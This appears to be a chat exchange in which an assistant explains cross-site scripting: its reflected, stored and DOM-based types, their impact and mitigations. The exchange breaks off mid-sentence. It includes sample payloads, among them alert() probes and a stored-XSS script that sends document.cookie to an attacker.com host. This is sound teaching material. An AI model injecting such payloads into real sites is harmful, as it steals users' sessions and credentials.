

# Introduction to Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a common web security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These attacks occur when an application includes untrusted data without proper validation or escaping.

## Key Concepts

1. **How XSS Works**:
   - Attacker injects malicious JavaScript code into a vulnerable website
   - Victim's browser executes the code in the context of the trusted site
   - Attacker can steal cookies, session tokens, or perform actions on behalf of the user

2. **Types of XSS**:
   - **Stored/Persistent XSS**: Malicious script is permanently stored on the target server
   - **Reflected XSS**: Malicious script is reflected off a web server in response
   - **DOM-based XSS**: Vulnerability exists in client-side code rather than server-side code

3. **Common Attack Vectors**:
   ```html
   <script>alert('XSS')</script>
   ```
   ```html
   <img src="x" onerror="alert('XSS')">
   ```
   ```javascript
   javascript:alert('XSS')
   ```

## Prevention Techniques

- Input validation and output encoding
- Implementing Content Security Policy (CSP)
- Using secure frameworks that auto-escape content
- Setting HttpOnly flag on cookies

Understanding XSS is fundamental for both developers (to prevent vulnerabilities) and security professionals (to test for them).

Further Explain the types of XSS extensively

 # **Introduction to Cross-Site Scripting (XSS) - Types Explained Extensively**

Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts execute in the victim's browser, potentially stealing sensitive data, hijacking sessions, or defacing websites.

XSS attacks are categorized into three main types:

1. **Reflected XSS**  
2. **Stored XSS**  
3. **DOM-based XSS**  

Each type has distinct characteristics and exploitation methods.

---

## **1. Reflected XSS (Non-Persistent)**
Reflected XSS occurs when malicious input from a user is immediately returned by the web application in an unsafe manner, typically in an error message, search result, or URL parameter.

### **How It Works:**
- The attacker crafts a malicious URL containing JavaScript.
- The victim clicks the link (e.g., via phishing).
- The server reflects the script back in the response.
- The victim's browser executes the script.

### **Example:**
```http
https://example.com/search?query=<script>alert('XSS')</script>
```
If the website displays `query` without sanitization, the script runs.

### **Impact:**
- Session hijacking via `document.cookie`.
- Redirecting users to malicious sites (`window.location`).
- Phishing attacks by modifying page content.

### **Mitigation:**
- Input validation & output encoding.
- Using Content Security Policy (CSP).
- Escaping user-supplied data before rendering.

---

## **2. Stored XSS (Persistent)**
Stored XSS occurs when malicious scripts are permanently stored on a target server (e.g., in a database, comment section, or forum post) and later executed when other users access the infected page.

### **How It Works:**
- Attacker submits malicious input stored on the server.
- Victim requests a page containing this stored data.
- Server serves the malicious script to the victim’s browser.
- Script executes in their context.

### **Example:**
A blog comment with:
```html
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```
When another user loads the page, their cookies are sent to the attacker.

### **Impact:**
- Long-term compromise of user accounts.
- Spread of malware

Continue from Stored XSS(persistent) Impact point

 Here's the continuation of the **Stored XSS (Persistent)** section, followed by **DOM-based XSS** and a conclusion:

---

## **2. Stored XSS (Persistent) - Continued**

### **Impact (Continued):**
- **Mass infection of users** (e.g., in social media posts or forums).  
- **Defacement of websites** by injecting permanent malicious content.  
- **Keylogging** by capturing user inputs (`onkeypress` events).  
- **Exploiting trust** (users trust the legitimate site, making attacks harder to detect).  

### **Mitigation:**  
- Strict input validation (whitelist allowed characters).  
- Output encoding before rendering user-generated content.  
- Regular security audits for stored data.  
- Use HTTP-only and Secure flags for cookies to limit theft.  

---

## **3. DOM-based XSS**  
DOM-based XSS occurs when JavaScript modifies the DOM unsafely using attacker-controlled input (e.g., URL fragments or `document.location`). Unlike Reflected/Stored XSS, the server isn’t directly